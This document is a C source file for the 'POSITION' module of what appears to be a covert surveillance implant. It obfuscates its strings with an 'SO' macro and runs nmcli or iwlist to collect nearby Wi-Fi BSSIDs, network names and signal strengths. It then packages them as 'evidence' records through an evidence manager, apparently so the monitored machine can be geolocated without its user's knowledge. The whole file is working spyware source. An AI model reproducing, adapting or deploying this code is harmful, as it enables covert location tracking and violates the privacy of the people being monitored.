#define _XOPEN_SOURCE
#include <string.h>
#include <stdio.h>
#include <openssl/bio.h>

#include "module.h"
#include "evidencemanager.h"
#include "me.h"
#include "so.h"
#include "bioutils.h"

#define EVIDENCE_VERSION 2010082401

struct entry {
   unsigned char bssid[6];
   unsigned int essidlen;
   char essid[32];
   int rssi;
   struct entry *next;
};

static struct entry *list = NULL, *listp = NULL;

static int position_networkmanager(void);
static int position_wirelesstools(void);

void *module_position_main(void *args)
{
   BIO *bio_additional = NULL, *bio_data = NULL;
   long additionallen, datalen;
   char *additionalptr, *dataptr;
   int count = 0;

   debugme("Module POSITION executed\n");

   do {
      if(!(bio_additional = BIO_new(BIO_s_mem()))) break;
      if(!(bio_data = BIO_new(BIO_s_mem()))) break;

      if(!position_networkmanager() && !position_wirelesstools()) break;

      for(listp = list; listp; listp = listp->next) {
         debugme("POSITION %02x:%02x:%02x:%02x:%02x:%02x %d %s\n", listp->bssid[0], listp->bssid[1], listp->bssid[2], listp->bssid[3], listp->bssid[4], listp->bssid[5], listp->rssi, listp->essid);
         if(BIO_write(bio_data, listp->bssid, sizeof(listp->bssid)) != sizeof(listp->bssid)) break;
         if(BIO_write(bio_data, "\x00\x00", 2) != 2) break;
         if(BIO_puti32(bio_data, strlen(listp->essid)) == -1) break;
         if(BIO_write(bio_data, listp->essid, sizeof(listp->essid)) == -1) break;
         if(BIO_puti32(bio_data, listp->rssi) == -1) break;
         count++;
      }
      if(listp) break;

      if(BIO_puti32(bio_additional, EVIDENCE_VERSION) == -1) break;
      if(BIO_puti32(bio_additional, 0x3) == -1) break;
      if(BIO_puti32(bio_additional, count) == -1) break;

      if(!(additionallen = BIO_get_mem_data(bio_additional, &additionalptr))) break;
      if(!(datalen = BIO_get_mem_data(bio_data, &dataptr))) break;

      evidence_write(EVIDENCE_TYPE_POSITION, additionalptr, additionallen, dataptr, datalen);
   } while(0);
   if(bio_additional) BIO_free(bio_additional);
   if(bio_data) BIO_free(bio_data);

   for(listp = list; listp;) {
      list = listp;
      listp = listp->next;
      free(list);
   }
   list = NULL;

   debugme("Module POSITION ended\n");

   return NULL;
}

static int position_networkmanager(void)
{
   FILE *pp = NULL;
   char buf[128], bssid[6], essid[32];
   int rssi;
   int count = 0;

   do {
      if(!(pp = popen(SO"nmcli -t -f BSSID,SIGNAL,SSID -e no dev wifi", "r"))) break;
      while(fgets(buf, sizeof(buf), pp)) {
         sscanf(buf, SO"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx:%d:'%31[^']'", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5], &rssi, essid);
         rssi = (60 * rssi / 100) - 95;
         /* TODO gestire con una lista */
         if(!list) {
            if(!(list = malloc(sizeof(struct entry)))) break;
            listp = list;
         } else {
            if(!(listp->next = malloc(sizeof(struct entry)))) break;
            listp = listp->next;
         }

         listp->next = NULL;
         memcpy(listp->bssid, bssid, sizeof(listp->bssid));
         listp->essidlen = strlen(essid);
         strcpy(listp->essid, essid);
         listp->rssi = rssi;
         /* TODO */
         count++;
      }
   } while(0);
   if(pp) pclose(pp);

   return count;
}

static int position_wirelesstools(void)
{
   FILE *pp = NULL;
   char buf[128], bssid[6], essid[32];
   int levcur, levmax, rssi;
   int count = 0, v1 = 0, v2 = 0, v3 = 0;

   do {
      if(!(pp = popen(SO"/sbin/iwlist scan", "r"))) break; /* XXX TODO impostare la variabile PATH con /sbin e /usr/sbin */
      while(fgets(buf, sizeof(buf), pp)) {
         if(sscanf(buf, SO" Cell %*d - Address: %hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]) == 6) { v1 = 1; }
         else if(sscanf(buf, SO" ESSID:\"%31[^\"]", essid) == 1) { v2 = 1; }
         else if(sscanf(buf, SO" Quality%*[:=]%d/%d", &levcur, &levmax) == 2) { v3 = 1; rssi = (60 * levcur / levmax) - 95; }
         else if(sscanf(buf, SO" Signal level%*[:=]%d/%d", &levcur, &levmax) == 2) { v3 = 1; rssi = (60 * levcur / levmax) - 95; }
         else if(sscanf(buf, SO" Signal level%*[:=]%d dBm", &rssi) == 1) { v3 = 1; }

         if(!(v1 && v2 && v3)) continue;

         /* TODO gestire con una lista */
         if(!list) {
            if(!(list = malloc(sizeof(struct entry)))) break;
            listp = list;
         } else {
            if(!(listp->next = malloc(sizeof(struct entry)))) break;
            listp = listp->next;
         }

         listp->next = NULL;
         memcpy(listp->bssid, bssid, sizeof(listp->bssid));
         listp->essidlen = strlen(essid);
         strcpy(listp->essid, essid);
         listp->rssi = rssi;
         /* TODO */
         count++;
         v1 = v2 = v3 = 0;
      }
   } while(0);
   if(pp) pclose(pp);

   return count;
}
